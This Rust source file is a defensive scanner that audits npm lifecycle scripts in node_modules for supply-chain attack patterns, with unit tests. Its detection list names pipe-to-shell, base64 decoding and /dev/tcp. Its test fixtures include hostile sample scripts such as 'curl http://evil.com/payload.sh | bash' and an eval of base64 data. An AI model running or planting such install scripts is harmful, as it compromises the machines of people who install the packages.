//! npm postinstall script audit
//!
//! Scans `node_modules/` directories for packages with lifecycle scripts
//! (preinstall, postinstall, install, prepare) and analyzes them for
//! suspicious patterns commonly used in supply chain attacks.

use crate::checks::SupplyChainCheck;
use crate::types::SupplyChainContext;
use protectinator_container::filesystem::ContainerFs;
use protectinator_core::{Finding, FindingSource, Severity};
use tracing::debug;
use walkdir::WalkDir;

/// Lifecycle script fields that are executed automatically by npm
const LIFECYCLE_SCRIPTS: &[&str] = &["preinstall", "postinstall", "install", "prepare"];

/// Well-known packages that legitimately use lifecycle scripts for native compilation
const WHITELISTED_PACKAGES: &[&str] = &[
    "fsevents",
    "sharp",
    "better-sqlite3",
    "bcrypt",
    "canvas",
    "grpc",
    "node-sass",
    "esbuild",
    "turbo",
    "protobufjs",
    "cpu-features",
    "ssh2",
    "sodium-native",
    "keytar",
    "deasync",
];

/// Script content patterns that indicate legitimate native compilation
const WHITELISTED_SCRIPT_PATTERNS: &[&str] = &[
    "node-gyp rebuild",
    "prebuild-install",
    "esbuild",
    "node install.js",
    "node-pre-gyp",
    "cmake-js",
    "napi build",
    "prebuild --install",
];

/// Critical patterns: strong indicators of malicious activity
const CRITICAL_PATTERNS: &[&str] = &[
    "| sh",
    "| bash",
    "| zsh",
    "base64 -d",
    "base64 --decode",
    "/dev/tcp/",
    "eval(buffer.from(",
    "eval(require('child_process')",
    "eval(require(\"child_process\")",
];

/// Minimum length for a single-line string to be considered suspiciously encoded
const ENCODED_STRING_MIN_LENGTH: usize = 500;

/// Audits npm lifecycle scripts for supply chain attack indicators
pub struct NpmPostinstallCheck;

impl SupplyChainCheck for NpmPostinstallCheck {
    fn id(&self) -> &str {
        "supply-chain-npm-postinstall"
    }

    fn name(&self) -> &str {
        "npm Postinstall Script Audit"
    }

    fn run(&self, fs: &ContainerFs, _ctx: &SupplyChainContext) -> Vec<Finding> {
        let mut findings = Vec::new();

        // Walk from the filesystem root to find node_modules directories (max_depth=5)
        let fs_root = fs.root().to_path_buf();
        for entry in WalkDir::new(&fs_root)
            .max_depth(5)
            .into_iter()
            .filter_map(|e| e.ok())
        {
            if !entry.file_type().is_dir() {
                continue;
            }
            let Some(name) = entry.file_name().to_str() else {
                continue;
            };
            if name != "node_modules" {
                continue;
            }

            let nm_path = entry.path().to_path_buf();
            debug!("Scanning node_modules at {}", nm_path.display());

            // Scan direct children and scoped packages (max_depth=2)
            scan_node_modules(&nm_path, &fs_root, &mut findings);
        }

        findings
    }
}

/// Scan a node_modules directory for packages with lifecycle scripts
fn scan_node_modules(
    nm_path: &std::path::Path,
    fs_root: &std::path::Path,
    findings: &mut Vec<Finding>,
) {
    for entry in WalkDir::new(nm_path)
        .min_depth(1)
        .max_depth(2)
        .into_iter()
        .filter_map(|e| e.ok())
    {
        if !entry.file_type().is_dir() {
            continue;
        }

        let pkg_json_path = entry.path().join("package.json");
        if !pkg_json_path.exists() {
            continue;
        }

        let Ok(content) = std::fs::read_to_string(&pkg_json_path) else {
            continue;
        };

        let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&content) else {
            continue;
        };

        let pkg_name = parsed
            .get("name")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown");

        let Some(scripts) = parsed.get("scripts").and_then(|v| v.as_object()) else {
            continue;
        };

        // Collect lifecycle scripts present in this package
        for &lifecycle in LIFECYCLE_SCRIPTS {
            let Some(script_val) = scripts.get(lifecycle).and_then(|v| v.as_str()) else {
                continue;
            };

            // Compute the display path relative to the fs root
            let display_path = pkg_json_path
                .strip_prefix(fs_root)
                .map(|p| format!("/{}", p.display()))
                .unwrap_or_else(|_| pkg_json_path.display().to_string());

            let severity = analyze_script(pkg_name, script_val);

            match severity {
                ScriptRisk::Critical(reason) => {
                    findings.push(
                        Finding::new(
                            format!(
                                "supply-chain-npm-postinstall-critical-{}-{}",
                                sanitize(pkg_name),
                                lifecycle
                            ),
                            format!(
                                "Critical npm lifecycle script in {}: {}",
                                pkg_name, lifecycle
                            ),
                            format!(
                                "Package \"{}\" has a {} script with critical risk pattern: {}. Script: {}",
                                pkg_name,
                                lifecycle,
                                reason,
                                truncate(script_val, 300),
                            ),
                            Severity::Critical,
                            make_source(),
                        )
                        .with_resource(&display_path)
                        .with_remediation(format!(
                            "Immediately audit the package \"{}\". Remove it if not explicitly trusted. \
                             Run `npm ls {}` to see why it was installed.",
                            pkg_name, pkg_name
                        ))
                        .with_metadata("package", serde_json::json!(pkg_name))
                        .with_metadata("lifecycle", serde_json::json!(lifecycle))
                        .with_metadata("script", serde_json::json!(truncate(script_val, 1000)))
                        .with_reference(
                            "https://blog.phylum.io/npm-install-scripts-supply-chain-attack",
                        ),
                    );
                }
                ScriptRisk::High(reason) => {
                    findings.push(
                        Finding::new(
                            format!(
                                "supply-chain-npm-postinstall-high-{}-{}",
                                sanitize(pkg_name),
                                lifecycle
                            ),
                            format!(
                                "Suspicious npm lifecycle script in {}: {}",
                                pkg_name, lifecycle
                            ),
                            format!(
                                "Package \"{}\" has a {} script with suspicious pattern: {}. Script: {}",
                                pkg_name,
                                lifecycle,
                                reason,
                                truncate(script_val, 300),
                            ),
                            Severity::High,
                            make_source(),
                        )
                        .with_resource(&display_path)
                        .with_remediation(format!(
                            "Review the {} script in package \"{}\". Verify it is performing \
                             expected operations.",
                            lifecycle, pkg_name
                        ))
                        .with_metadata("package", serde_json::json!(pkg_name))
                        .with_metadata("lifecycle", serde_json::json!(lifecycle))
                        .with_metadata("script", serde_json::json!(truncate(script_val, 1000))),
                    );
                }
                ScriptRisk::Whitelisted => {
                    findings.push(
                        Finding::new(
                            format!(
                                "supply-chain-npm-postinstall-info-{}-{}",
                                sanitize(pkg_name),
                                lifecycle
                            ),
                            format!(
                                "Known lifecycle script in {}: {}",
                                pkg_name, lifecycle
                            ),
                            format!(
                                "Package \"{}\" has a {} script that matches known legitimate patterns: {}",
                                pkg_name,
                                lifecycle,
                                truncate(script_val, 200),
                            ),
                            Severity::Info,
                            make_source(),
                        )
                        .with_resource(&display_path)
                        .with_metadata("package", serde_json::json!(pkg_name))
                        .with_metadata("lifecycle", serde_json::json!(lifecycle)),
                    );
                }
                ScriptRisk::Medium => {
                    findings.push(
                        Finding::new(
                            format!(
                                "supply-chain-npm-postinstall-medium-{}-{}",
                                sanitize(pkg_name),
                                lifecycle
                            ),
                            format!(
                                "npm lifecycle script present in {}: {}",
                                pkg_name, lifecycle
                            ),
                            format!(
                                "Package \"{}\" has a {} script: {}. Lifecycle scripts run automatically \
                                 and should be reviewed.",
                                pkg_name,
                                lifecycle,
                                truncate(script_val, 200),
                            ),
                            Severity::Medium,
                            make_source(),
                        )
                        .with_resource(&display_path)
                        .with_remediation(format!(
                            "Review the {} script in package \"{}\". Consider using \
                             --ignore-scripts if the script is not needed.",
                            lifecycle, pkg_name
                        ))
                        .with_metadata("package", serde_json::json!(pkg_name))
                        .with_metadata("lifecycle", serde_json::json!(lifecycle))
                        .with_metadata("script", serde_json::json!(truncate(script_val, 1000))),
                    );
                }
            }
        }
    }
}

/// Risk level determined by script analysis
enum ScriptRisk {
    Critical(String),
    High(String),
    Medium,
    Whitelisted,
}

/// Analyze a lifecycle script and determine its risk level
fn analyze_script(pkg_name: &str, script: &str) -> ScriptRisk {
    let lower = script.to_lowercase();

    // Check for critical patterns first
    for pattern in CRITICAL_PATTERNS {
        if lower.contains(pattern) {
            return ScriptRisk::Critical(format!("contains '{}'", pattern));
        }
    }

    // Check for very long single-line strings (encoded/obfuscated payloads)
    if !script.contains('\n') && script.len() > ENCODED_STRING_MIN_LENGTH {
        return ScriptRisk::Critical(
            "single-line script exceeds 500 characters (possible encoded payload)".to_string(),
        );
    }

    // Check for curl/wget downloads (without pipe-to-shell, which was caught above)
    if lower.contains("curl ") || lower.contains("wget ") {
        return ScriptRisk::High("downloads content via curl/wget".to_string());
    }

    // Check for nc/netcat
    if lower.contains("netcat ") || lower.contains(" nc ") || lower.starts_with("nc ") {
        return ScriptRisk::High("uses netcat".to_string());
    }

    // Check for node -e with potential obfuscation
    if lower.contains("node -e") || lower.contains("node -p") {
        // Check if the argument looks obfuscated (long base64-ish strings)
        if script.len() > 100 {
            return ScriptRisk::High(
                "node -e with lengthy inline code (possible obfuscation)".to_string(),
            );
        }
    }

    // Check whitelists: known packages
    if WHITELISTED_PACKAGES
        .iter()
        .any(|&wp| pkg_name == wp)
    {
        return ScriptRisk::Whitelisted;
    }

    // Check whitelists: known script patterns
    if WHITELISTED_SCRIPT_PATTERNS
        .iter()
        .any(|&pattern| lower.contains(pattern))
    {
        return ScriptRisk::Whitelisted;
    }

    // Any other lifecycle script is medium (informational)
    ScriptRisk::Medium
}

/// Create the standard FindingSource for npm postinstall checks
fn make_source() -> FindingSource {
    FindingSource::SupplyChain {
        check_category: "package_scripts".to_string(),
        ecosystem: Some("npm".to_string()),
    }
}

/// Truncate a string to a maximum length
fn truncate(s: &str, max_len: usize) -> String {
    if s.len() <= max_len {
        s.to_string()
    } else {
        format!("{}...", &s[..max_len])
    }
}

/// Sanitize a package name for use in finding IDs
fn sanitize(name: &str) -> String {
    name.replace('/', "-")
        .replace('@', "")
        .replace('.', "-")
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    fn make_ctx(_tmp: &TempDir) -> SupplyChainContext {
        SupplyChainContext {
            root: std::path::PathBuf::from("/"),
            user_homes: Vec::new(),
            lock_files: Vec::new(),
            packages: Vec::new(),
            online: false,
        }
    }

    fn write_package_json(tmp: &TempDir, pkg_path: &str, content: &str) {
        let full = tmp.path().join(pkg_path);
        std::fs::create_dir_all(full.parent().unwrap()).unwrap();
        std::fs::write(full, content).unwrap();
    }

    #[test]
    fn test_clean_package_no_findings() {
        let tmp = TempDir::new().unwrap();
        let fs = ContainerFs::new(tmp.path());
        let ctx = make_ctx(&tmp);

        write_package_json(
            &tmp,
            "project/node_modules/lodash/package.json",
            r#"{"name": "lodash", "version": "4.17.21", "scripts": {"test": "mocha"}}"#,
        );

        let check = NpmPostinstallCheck;
        let findings = check.run(&fs, &ctx);
        assert!(findings.is_empty(), "Package without lifecycle scripts should produce no findings");
    }

    #[test]
    fn test_critical_pipe_to_shell() {
        let tmp = TempDir::new().unwrap();
        let fs = ContainerFs::new(tmp.path());
        let ctx = make_ctx(&tmp);

        write_package_json(
            &tmp,
            "project/node_modules/evil-pkg/package.json",
            r#"{"name": "evil-pkg", "version": "1.0.0", "scripts": {"postinstall": "curl http://evil.com/payload.sh | bash"}}"#,
        );

        let check = NpmPostinstallCheck;
        let findings = check.run(&fs, &ctx);
        assert!(!findings.is_empty(), "Should detect pipe-to-shell");
        let critical: Vec<_> = findings.iter().filter(|f| f.severity == Severity::Critical).collect();
        assert!(!critical.is_empty(), "Pipe-to-shell should be critical");
    }

    #[test]
    fn test_high_curl_download() {
        let tmp = TempDir::new().unwrap();
        let fs = ContainerFs::new(tmp.path());
        let ctx = make_ctx(&tmp);

        write_package_json(
            &tmp,
            "project/node_modules/sketchy/package.json",
            r#"{"name": "sketchy", "version": "0.1.0", "scripts": {"postinstall": "curl -o helper.bin http://example.com/bin && chmod +x helper.bin"}}"#,
        );

        let check = NpmPostinstallCheck;
        let findings = check.run(&fs, &ctx);
        let high: Vec<_> = findings.iter().filter(|f| f.severity == Severity::High).collect();
        assert!(!high.is_empty(), "curl download should be high severity");
    }

    #[test]
    fn test_whitelisted_package_is_info() {
        let tmp = TempDir::new().unwrap();
        let fs = ContainerFs::new(tmp.path());
        let ctx = make_ctx(&tmp);

        write_package_json(
            &tmp,
            "project/node_modules/sharp/package.json",
            r#"{"name": "sharp", "version": "0.33.0", "scripts": {"install": "node install/libvips && node install/dll-copy"}}"#,
        );

        let check = NpmPostinstallCheck;
        let findings = check.run(&fs, &ctx);
        assert!(!findings.is_empty(), "Should still report whitelisted packages");
        assert!(
            findings.iter().all(|f| f.severity == Severity::Info),
            "Whitelisted package should be Info severity"
        );
    }

    #[test]
    fn test_whitelisted_script_pattern_is_info() {
        let tmp = TempDir::new().unwrap();
        let fs = ContainerFs::new(tmp.path());
        let ctx = make_ctx(&tmp);

        write_package_json(
            &tmp,
            "project/node_modules/my-native-addon/package.json",
            r#"{"name": "my-native-addon", "version": "2.0.0", "scripts": {"install": "node-gyp rebuild"}}"#,
        );

        let check = NpmPostinstallCheck;
        let findings = check.run(&fs, &ctx);
        assert!(!findings.is_empty());
        assert!(
            findings.iter().all(|f| f.severity == Severity::Info),
            "node-gyp rebuild should be whitelisted as Info"
        );
    }

    #[test]
    fn test_medium_generic_lifecycle_script() {
        let tmp = TempDir::new().unwrap();
        let fs = ContainerFs::new(tmp.path());
        let ctx = make_ctx(&tmp);

        write_package_json(
            &tmp,
            "project/node_modules/some-pkg/package.json",
            r#"{"name": "some-pkg", "version": "1.0.0", "scripts": {"postinstall": "node setup.js"}}"#,
        );

        let check = NpmPostinstallCheck;
        let findings = check.run(&fs, &ctx);
        let medium: Vec<_> = findings.iter().filter(|f| f.severity == Severity::Medium).collect();
        assert!(!medium.is_empty(), "Generic lifecycle script should be medium severity");
    }

    #[test]
    fn test_scoped_package_detected() {
        let tmp = TempDir::new().unwrap();
        let fs = ContainerFs::new(tmp.path());
        let ctx = make_ctx(&tmp);

        write_package_json(
            &tmp,
            "project/node_modules/@evil/malware/package.json",
            r#"{"name": "@evil/malware", "version": "1.0.0", "scripts": {"preinstall": "eval(Buffer.from('payload','base64').toString())"}}"#,
        );

        let check = NpmPostinstallCheck;
        let findings = check.run(&fs, &ctx);
        let critical: Vec<_> = findings.iter().filter(|f| f.severity == Severity::Critical).collect();
        assert!(!critical.is_empty(), "Scoped package with eval(Buffer.from) should be critical");
    }

    #[test]
    fn test_encoded_long_string_critical() {
        let tmp = TempDir::new().unwrap();
        let fs = ContainerFs::new(tmp.path());
        let ctx = make_ctx(&tmp);

        let long_payload = "a".repeat(600);
        let pkg_json = format!(
            r#"{{"name": "obfuscated", "version": "1.0.0", "scripts": {{"postinstall": "{}"}}}}"#,
            long_payload
        );
        write_package_json(
            &tmp,
            "project/node_modules/obfuscated/package.json",
            &pkg_json,
        );

        let check = NpmPostinstallCheck;
        let findings = check.run(&fs, &ctx);
        let critical: Vec<_> = findings.iter().filter(|f| f.severity == Severity::Critical).collect();
        assert!(!critical.is_empty(), "Very long single-line script should be critical");
    }
}
